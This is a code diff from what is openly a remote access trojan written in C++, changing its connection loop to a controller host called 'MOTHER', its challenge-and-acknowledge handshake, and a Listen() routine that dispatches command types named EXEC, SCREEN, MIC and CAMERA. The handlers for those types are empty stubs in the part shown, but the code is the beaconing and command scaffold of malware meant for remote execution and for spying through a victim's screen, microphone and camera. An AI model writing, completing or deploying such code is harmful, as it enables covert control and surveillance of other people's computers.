@@ -11,6 +11,7 @@ Rat::Rat(): lhost(LHOST), lport(LPORT) {
 
     while (true) {
         Ping();
+        std::cout << "[+] Established with MOTHER!" << std::endl;
         Listen();
     }
 
@@ -67,17 +68,12 @@ bool Rat::EstablishConnection() {
 
     RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT));
 
-
-    // char buffer[1024] = {0};
-    // int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
     std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
 
     if (recvPacket.second) {
         std::cout << "[*] Recv Challenge. . ." << std::endl;
 
         // recv challenge
-        // std::string challData = std::string(buffer, bytesReceived);
-        // RatPacket challPacket(challData.c_str());
         std::string code = recvPacket.first.GetPacketMessage();
 
         std::cout << "[*] Replying to Challenge. . ." << std::endl;
@@ -85,13 +81,10 @@ bool Rat::EstablishConnection() {
         RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT));
 
         // final ack of before possible estab
-        char buffer[1024] = {0};
-        int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) {
+        recvPacket = RatPacketUtils::Recv(mother);
+        if (recvPacket.second) {
             std::cout << "[*] Recv Estab Ack. . ." << std::endl;
-            std::string ackData = std::string(buffer, bytesReceived);
-            RatPacket ackPacket(ackData.c_str());
-            return ackPacket.GetPacketMessage() == "ratty";
+            return recvPacket.first.GetPacketMessage() == "ratty";
         }
         return false;
     } else {
@@ -102,5 +95,28 @@ bool Rat::EstablishConnection() {
 
 // send non-init packets back to mother
 void Rat::Listen() {
-    std::cout << "[+] Established with MOTHER!" << std::endl;
+    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
+    if (recvPacket.second) {
+        RatPacket packet = recvPacket.first;
+        // process packet data
+        if (packet.GetType() == MsgType::EXEC) {
+
+        } else if (packet.GetType() == MsgType::SCREEN) {
+
+        } else if (packet.GetType() == MsgType::MIC) {
+
+        } else if (packet.GetType() == MsgType::CAMERA) {
+
+        } else if (packet.GetType() == MsgType::NONE) {
+            // connection closed by remote endpoint
+            if (packet.GetPacketMessage() == "closed") {
+                std::cerr << "[-] Socket connection closed." << std::endl;
+                ratState = RatState::LOST;
+                return;
+            }
+        } else {
+            std::cerr << "[*] Unsure how to process typeid: " <<
+                static_cast<int>(packet.GetType()) << std::endl;
+        }
+    }
 }
